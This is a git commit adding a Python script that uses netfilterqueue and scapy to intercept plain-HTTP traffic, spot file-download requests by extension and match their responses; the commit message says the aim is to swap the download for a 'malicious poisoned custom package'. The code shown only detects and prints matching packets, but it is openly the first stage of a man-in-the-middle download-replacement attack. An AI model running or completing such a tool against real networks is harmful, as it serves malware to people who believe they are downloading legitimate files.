ad8bd86471d28d01e4f5b3257e98eedc1b866b89
root <fonso.gonzalezsan@gmail.com>
2020-05-15 13:38:47 -0400

    repalces_download.py is looking for packets with Http Layer (only works over http connection, non https) and find download  with extension type ie: ".zip, .pdf, .exe,...." in order to replace response package raw load data for malicious poisonod custom package

---
+++ replace_downlad.py
@@ -0,0 +1,31 @@
+#!/usr/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+extension ="zip"
+
+
+def process_packet(packet):
+    scapy_packet= scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if extension in scapy_packet[scapy.Raw].load:
+                print("[+] donwload pdf file Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if extension in scapy_packet[scapy.Raw].load:
+                if scapy_packet[scapy.TCP].seq in ack_list:
+                    print("[+] response downlad file pdf type")
+                    print(scapy_packet.show())
+    packet.accept()
+
+
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+
